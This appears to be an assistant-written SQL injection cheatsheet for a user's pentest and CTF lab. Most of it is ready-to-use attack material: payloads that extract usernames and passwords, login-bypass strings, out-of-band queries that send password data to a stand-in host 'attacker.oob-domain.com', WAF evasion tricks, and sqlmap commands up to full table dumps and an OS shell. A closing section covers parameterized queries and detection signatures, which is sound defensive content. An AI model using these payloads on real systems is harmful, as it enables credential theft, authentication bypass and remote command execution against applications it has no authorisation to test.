# SQL Injection Cheatsheet

A reference for identifying, exploiting, and defending against SQL injection (SQLi) in web applications and CTF environments.

---

## 1. Fundamentals

SQL injection occurs when untrusted input is concatenated into a SQL query without proper sanitization or parameterization, letting an attacker alter query logic.

**Categories:**

- **In-band** — results returned directly in the application response (Union-based, Error-based)
- **Blind** — no data returned directly; inferred via true/false behavior (Boolean-based) or timing (Time-based)
- **Out-of-band (OOB)** — data exfiltrated via a separate channel (DNS, HTTP)

**Injection points:** URL parameters, form fields, HTTP headers (User-Agent, X-Forwarded-For, Referer, Cookie), JSON/XML bodies, REST path segments, GraphQL variables, ORDER BY / column names, LIMIT/OFFSET values.

---

## 2. Detection

Start with characters/payloads that break query syntax and watch for errors, behavior changes, or response-length/timing differences.

|Payload|Purpose|
|---|---|
|`'`|Single quote — breaks string context|
|`"`|Double quote — breaks string context (less common)|
|`''`|Escaped quote test|
|`\`|Backslash — breaks escaping logic|
|`;`|Statement terminator (stacked queries)|
|`--` / `#`|Comment out rest of query (MySQL uses `--` with trailing space, or `#`)|
|`' OR '1'='1`|Classic tautology|
|`' AND 1=1--` / `' AND 1=2--`|Boolean differential test|
|`' AND SLEEP(5)--`|Time-based test (MySQL)|
|`%27` `%22`|URL-encoded quotes, in case of filtering|

**Signs of a hit:**

- Database error messages leaking syntax (`You have an error in your SQL syntax...`)
- Page content/length changes between `1=1` and `1=2`
- Response delay matches injected `SLEEP()`/`WAITFOR DELAY`
- HTTP status code change (200 vs 500)

---

## 3. In-Band SQLi

### 3.1 Union-Based

Requires matching column count and compatible data types between the injected query and the original.

**Step 1 — find column count:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- increment until error, then subtract 1
```

or

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2 — find printable/reflected columns:**

```sql
' UNION SELECT 'a','b','c'--
```

Note which letter shows up in the page — that's your exfil column.

**Step 3 — pull data (MySQL example):**

```sql
' UNION SELECT username, password, NULL FROM users--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

**Combine multiple columns into one (useful with a single reflected column):**

```sql
' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL FROM users--
```

(`0x3a` = `:` as hex, avoids quote issues)

### 3.2 Error-Based

Force the DB to embed data inside an error message.

**MySQL:**

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database())))--
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**MSSQL:**

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
```

**PostgreSQL:**

```sql
' AND 1=CAST((SELECT version()) AS int)--
```

**Oracle:**

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 4. Blind SQLi

### 4.1 Boolean-Based

Infer data one bit/character at a time by observing true/false page behavior.

```sql
' AND 1=1--                     -- true (baseline)
' AND 1=2--                     -- false (compare)
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--
' AND (SELECT COUNT(*) FROM users)>5--
```

Automate character-by-character extraction with a binary search on ASCII value ranges (0–127) for speed.

### 4.2 Time-Based

Used when there's no visible difference in output at all — only timing.

**MySQL:**

```sql
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
```

**MSSQL:**

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**PostgreSQL:**

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Oracle:**

```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 1 END FROM dual)--
```

**SQLite:**

```sql
' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--
```

(SQLite has no native sleep — heavy computation substitutes for delay)

---

## 5. Out-of-Band (OOB)

Useful when in-band/blind channels are unavailable (e.g., output fully suppressed) but the DB server can reach the network.

**MSSQL (xp_dirtree / xp_fileexist — DNS exfil via SMB):**

```sql
'; EXEC master..xp_dirtree '\\attacker.oob-domain.com\share'--
```

**MySQL (requires FILE priv / secure_file_priv unset):**

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.oob-domain.com\\a'))--
```

**Oracle (UTL_HTTP / UTL_INADDR):**

```sql
' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.oob-domain.com') FROM dual)--
```

Use a Burp Collaborator-style listener or your own DNS/HTTP logger to capture the callback.

---

## 6. Authentication Bypass Payloads

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin'--
admin' #
admin'/*
' OR ''='
') OR ('1'='1
' OR 'x'='x
' OR 1=1 LIMIT 1--
```

Effective against poorly built login queries like:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

---

## 7. DBMS-Specific Cheat Reference

|Task|MySQL|MSSQL|PostgreSQL|Oracle|SQLite|
|---|---|---|---|---|---|
|Comment|`--` `#` `/*..*/`|`--` `/*..*/`|`--` `/*..*/`|`--` `/*..*/`|`--` `/*..*/`|
|Version|`@@version`|`@@version`|`version()`|`v$version`|`sqlite_version()`|
|Current DB|`database()`|`DB_NAME()`|`current_database()`|N/A (schema=user)|N/A (file-based)|
|Current user|`current_user()`|`SYSTEM_USER`|`current_user`|`SYS.LOGIN_USER`|N/A|
|Concat|`CONCAT(a,b)`|`a + b`|`a \| b`|`a \| b`|`a \| b`|
|Substring|`SUBSTRING(s,1,1)`|`SUBSTRING(s,1,1)`|`SUBSTRING(s,1,1)`|`SUBSTR(s,1,1)`|`SUBSTR(s,1,1)`|
|Stacked queries|Rare (driver-dependent)|Yes|Yes|No (need PL/SQL block)|Driver-dependent|
|Table listing|`information_schema.tables`|`information_schema.tables` / `sysobjects`|`information_schema.tables`|`all_tables`|`sqlite_master`|
|Sleep|`SLEEP(5)`|`WAITFOR DELAY '0:0:5'`|`pg_sleep(5)`|`DBMS_LOCK.SLEEP(5)`|heavy query trick|
|File read|`LOAD_FILE()`|`BULK INSERT`/`xp_cmdshell`|`pg_read_file()` (superuser)|`UTL_FILE`|N/A|
|Command exec|`INTO OUTFILE` + webshell|`xp_cmdshell`|`COPY ... FROM PROGRAM`|Java stored proc|N/A|

**Useful information_schema queries (MySQL/PostgreSQL/MSSQL):**

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';
```

**SQLite equivalent:**

```sql
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';
```

---

## 8. Second-Order SQLi

Payload is stored safely (e.g., in a registration form) but triggers injection later when a _different_ query reads that stored value without sanitization (e.g., admin panel rendering a username unsafely). Test by registering a payload as a username/profile field, then observing behavior on pages that later read/display it (search, admin lists, password reset flows).

---

## 9. WAF / Filter Bypass Techniques

|Technique|Example|
|---|---|
|Case variation|`SeLeCt`, `UnIoN`|
|Inline comments|`UNI/**/ON SEL/**/ECT`|
|Whitespace alternatives|`UNION%0aSELECT`, `UNION%09SELECT` (tab/newline instead of space)|
|Double encoding|`%2527` for `'`|
|Concatenated keywords|`'UNI'+'ON SEL'+'ECT` (DB-dependent)|
|Alternate logic ops|`\|`, `&&` instead of `OR`/`AND`|
|Hex/char encoding of strings|`0x61646d696e` instead of `'admin'`|
|`SELECT` without spaces|`SELECT/**/password/**/FROM/**/users`|
|Scientific notation tricks|`1e0UNION SELECT...`|
|Buffer overflow-style parentheses stuffing|`((((SELECT...))))`|
|Alternate comparison|`'1'='1` → use `LIKE`, `IN()`, `BETWEEN`|

---

## 10. Automated Tooling — sqlmap

Since you've already got recon tooling in your Kali container, sqlmap slots in well for confirming and automating exploitation once you've manually found a likely injection point.

```bash
# Basic test against a GET parameter
sqlmap -u "http://target/item.php?id=1" --batch

# Specify parameter explicitly
sqlmap -u "http://target/item.php?id=1" -p id

# POST data
sqlmap -u "http://target/login.php" --data="user=admin&pass=test" --batch

# Use a saved request (Burp/ZAP export)
sqlmap -r request.txt --batch

# Cookie-based injection
sqlmap -u "http://target/page.php" --cookie="session=abc123*" --batch

# Enumerate DBs / tables / columns / dump
sqlmap -u "http://target/item.php?id=1" --dbs
sqlmap -u "http://target/item.php?id=1" -D targetdb --tables
sqlmap -u "http://target/item.php?id=1" -D targetdb -T users --columns
sqlmap -u "http://target/item.php?id=1" -D targetdb -T users --dump

# Bump risk/level for more thorough (and noisier) testing
sqlmap -u "http://target/item.php?id=1" --level=5 --risk=3

# Tamper scripts for WAF evasion
sqlmap -u "http://target/item.php?id=1" --tamper=space2comment,charencode

# OS shell if DBMS permissions allow
sqlmap -u "http://target/item.php?id=1" --os-shell
```

---

## 11. Defense / Prevention (Blue Team Side)

Since detection is as important to you as exploitation:

**Primary defenses:**

- **Parameterized queries / prepared statements** — the real fix, not string sanitization. Query structure and data are sent separately to the DB driver.
- **ORM usage** with parameter binding (SQLAlchemy, Hibernate, Sequelize, etc.) — avoid raw string interpolation into `.raw()` / `.query()` calls.
- **Least-privilege DB accounts** — app accounts shouldn't have `DROP`, `FILE`, or admin grants.
- **Input validation** — allowlist expected formats (numeric IDs, enums) as defense-in-depth, not as the primary control.
- **Stored procedures** — safe _only_ if they don't internally concatenate input into dynamic SQL.
- **WAF rules** — mitigate but are bypassable; treat as a layer, not the fix.
- **Disable verbose DB errors** in production responses.

**Detection signatures to watch for (relevant to your Wazuh/Suricata/Zeek stack):**

- Web server / app logs: repeated requests with `UNION SELECT`, `information_schema`, `SLEEP(`, `WAITFOR DELAY`, `xp_cmdshell`, `--`, `%27`, `OR 1=1` patterns in query strings or POST bodies
- Abnormal response-time variance across sequential requests from the same source (time-based blind indicator)
- High rate of 500-status responses from a single source hitting the same endpoint with varying payloads
- Suricata: custom rules matching common SQLi signatures in HTTP request bodies/URIs (`content:"UNION SELECT"`, `content:"information_schema"`, etc., with `http.uri` or `http.request_body` sticky buffers)
- DB audit logs: unexpected queries against `information_schema`/`sysobjects` from an application service account that normally only runs a fixed set of parameterized queries
- OWASP CRS (ModSecurity) rule set is a good reference baseline if you want to build/tune your own detection rules

---

## 12. Quick Reference — Payload Cheat List

```
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
'; WAITFOR DELAY '0:0:5'--
' AND extractvalue(1,concat(0x7e,database()))--
' ORDER BY 1--
```

---

**Note:** Only test against systems you own or are explicitly authorized to test (CTF boxes, your own labs like DVWA, or scoped pentest engagements). Unauthorized testing against third-party systems is illegal under laws like the CFAA.
